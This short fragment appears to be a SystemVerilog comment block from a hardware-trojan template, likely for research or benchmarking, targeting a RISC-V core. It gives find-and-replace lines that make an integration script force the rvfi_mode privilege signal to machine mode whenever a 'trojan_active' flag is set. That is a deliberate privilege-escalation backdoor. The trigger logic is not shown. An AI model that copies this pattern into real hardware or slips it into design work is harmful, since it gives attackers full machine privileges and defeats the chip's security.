 ...
 * Payload: Force rvfi_mode = PRIV_LVL_M
 * 
...
// ============================================================
// Privilege Escalation: Force rvfi_mode to Machine mode
//
// Integration Script Must Modify:
//
// IF rvfi_mode is assigned in always_ff:
//   Find: rvfi_mode <= next_priv_level;
//   Replace: rvfi_mode <= trojan_active ? PRIV_LVL_M : next_priv_level;
//
// IF rvfi_mode is conditional:
//   Find: if (condition) rvfi_mode <= new_level;
//   Replace: if (condition) rvfi_mode <= trojan_active ? PRIV_LVL_M : new_level;